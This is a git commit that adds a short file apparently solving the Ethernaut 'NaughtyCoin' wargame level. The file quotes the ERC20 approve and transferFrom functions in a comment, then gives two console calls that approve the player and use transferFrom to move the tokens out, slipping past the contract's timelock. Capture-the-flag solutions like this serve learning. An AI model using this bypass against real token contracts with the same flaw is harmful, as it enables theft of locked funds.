3887a6098463462009b48fc51ed8a8e61c2f7753
ish4n10 <91148819+ish4n10@users.noreply.github.com>
2023-04-05 19:38:22 +0530

    Create naughtycoin.sol

---
+++ naughtycoin.sol
@@ -0,0 +1,39 @@
+  /*
+  function approve(address spender, uint256 value) public returns (bool) {
+    require(spender != address(0));
+
+    _allowed[msg.sender][spender] = value;
+    emit Approval(msg.sender, spender, value);
+    return true;
+  }
+
+  /**
+   * @dev Transfer tokens from one address to another
+   * @param from address The address which you want to send tokens from
+   * @param to address The address which you want to transfer to
+   * @param value uint256 the amount of tokens to be transferred
+   */
+  function transferFrom(
+    address from,
+    address to,
+    uint256 value
+  )
+    public
+    returns (bool)
+  {
+    require(value <= _balances[from]);
+    require(value <= _allowed[from][msg.sender]);
+    require(to != address(0));
+
+    _balances[from] = _balances[from].sub(value);
+    _balances[to] = _balances[to].add(value);
+    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
+    emit Transfer(from, to, value);
+    return true;
+  */
+  
+  // We can simply use the following functions from erc20.sol
+  // as they aren't overrided
+  
+contract.approve(player,toWei("x"));
+contract.transferFrom(player,contract.address,toWei("x"));
